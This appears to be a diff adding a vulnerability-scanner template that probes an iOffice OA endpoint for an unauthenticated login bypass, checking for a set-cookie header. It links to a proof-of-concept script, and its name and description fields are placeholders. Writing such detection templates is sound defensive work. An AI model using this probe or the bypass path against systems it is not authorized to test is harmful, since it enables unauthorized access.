@@ -1,0 +1,18 @@
+id: iOffice-login-bypass
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://github.com/xinyisleep/pocscan/blob/ee0c74e68ec95b82a4e4ebcdb961d6ed18a44b77/%E7%BA%A2%E5%B8%86/oa%E7%BA%A2%E5%B8%86OA%20%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0.py#L32
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/iOffice/prg/interface/iologin215host.aspx"
+    matchers:
+      - type: word
+        part: header
+        words:
+          - 'set-cookie'
